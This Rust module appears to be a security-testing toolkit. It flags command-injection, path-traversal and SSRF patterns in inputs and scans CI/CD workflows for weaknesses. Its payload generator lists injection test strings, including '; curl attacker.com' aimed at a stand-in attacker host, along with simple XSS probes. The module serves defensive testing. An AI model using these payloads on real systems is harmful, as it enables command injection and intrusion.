// ========================================================================
// OFFENSIVE SECURITY TOOLS MODULE
// ========================================================================
// WARNING: This module contains security testing tools intended for
// AUTHORIZED SECURITY TESTING ONLY.
// 
// LEGAL NOTICE:
// - Only use these tools on systems you own or have explicit written 
//   permission to test
// - Unauthorized access to computer systems is illegal in most jurisdictions
// - The authors assume NO LIABILITY for misuse of these tools
// - These tools are provided for DEFENSIVE and EDUCATIONAL purposes only
// ========================================================================

use serde::{Deserialize, Serialize};
use regex::Regex;
use lazy_static::lazy_static;

lazy_static! {
    static ref SHELL_META_CHARS: Regex = Regex::new(r#"[;&|><$`\\]"#).unwrap();
}

/// ⚠️ USER WARNING: This tool is for authorized security testing only
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VulnerabilityProbe {
    pub target: String,
}

/// Types of vulnerability probes
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ProbeType {
    CommandInjection,
    PathTraversal,
    Ssrf,
    SqlInjection,
}

/// Findings from vulnerability probing
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProbeFinding {
    pub probe_type: ProbeType,
    pub payload: String,
    pub description: String,
    pub severity: String,
}

impl VulnerabilityProbe {
    /// Create a new vulnerability probe
    pub fn new(target: &str) -> Self {
        Self {
            target: target.to_string(),
        }
    }
    
    /// Check for command injection patterns
    pub fn check_command_injection(&self, input: &str) -> bool {
        SHELL_META_CHARS.is_match(input)
    }
    
    /// Check for path traversal patterns
    pub fn check_path_traversal(&self, input: &str) -> bool {
        input.contains("../") || input.contains("..\\")
    }
    
    /// Check for SSRF patterns
    pub fn check_ssrf(&self, input: &str) -> bool {
        let ssrf_patterns = ["localhost", "127.0.0.1", "169.254.169.254", "metadata.google.internal"];
        ssrf_patterns.iter().any(|p| input.to_lowercase().contains(p))
    }
}

/// ⚠️ USER WARNING: This tool is for authorized security testing only
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExploitSimulator {
    pub target: String,
}

/// Simulated exploit for testing
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SimulatedExploit {
    pub exploit_type: String,
    pub description: String,
    pub potential_impact: String,
    pub remediation: String,
}

impl ExploitSimulator {
    /// Analyze CI/CD workflow for weaknesses
    pub fn analyze_cicd_weakness(workflow_content: &str) -> Vec<SimulatedExploit> {
        let mut exploits = Vec::new();
        
        // Check for untrusted input usage
        if workflow_content.contains("${{ github.event.inputs") {
            exploits.push(SimulatedExploit {
                exploit_type: "Untrusted Input Execution".to_string(),
                description: "Workflow uses untrusted input from workflow_dispatch".to_string(),
                potential_impact: "Command injection via workflow inputs".to_string(),
                remediation: "Validate and sanitize all workflow inputs".to_string(),
            });
        }
        
        // Check for secrets exposure
        if workflow_content.contains("secrets.") && workflow_content.contains("echo") {
            exploits.push(SimulatedExploit {
                exploit_type: "Secret Exposure".to_string(),
                description: "Potential secret logging or exposure".to_string(),
                potential_impact: "Credential theft".to_string(),
                remediation: "Use environment files or masked outputs".to_string(),
            });
        }
        
        // Check for untrusted code checkout
        if workflow_content.contains("actions/checkout") && !workflow_content.contains("persist-credentials") {
            exploits.push(SimulatedExploit {
                exploit_type: "Untrusted Repository Checkout".to_string(),
                description: "Code checked out without disabling credential persistence".to_string(),
                potential_impact: "Credential theft via malicious repository".to_string(),
                remediation: "Set persist-credentials: false or use sparse-checkout".to_string(),
            });
        }
        
        exploits
    }
}

/// ⚠️ USER WARNING: This tool is for authorized security testing only
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadGenerator {
    pub category: String,
}

impl PayloadGenerator {
    /// Generate test payloads (educational/defensive use)
    pub fn generate_test_payloads(category: &str) -> Vec<String> {
        match category {
            "cicd" => vec![
                "$(whoami)".to_string(),
                "`id`".to_string(),
                "${ENV_VAR}".to_string(),
                "; curl attacker.com".to_string(),
            ],
            "web" => vec![
                "<script>alert(1)</script>".to_string(),
                "'><img src=x onerror=alert(1)>".to_string(),
            ],
            _ => vec![],
        }
    }
}

/// Check if input contains potentially dangerous shell metacharacters
pub fn check_dangerous_input(input: &str) -> bool {
    SHELL_META_CHARS.is_match(input)
}
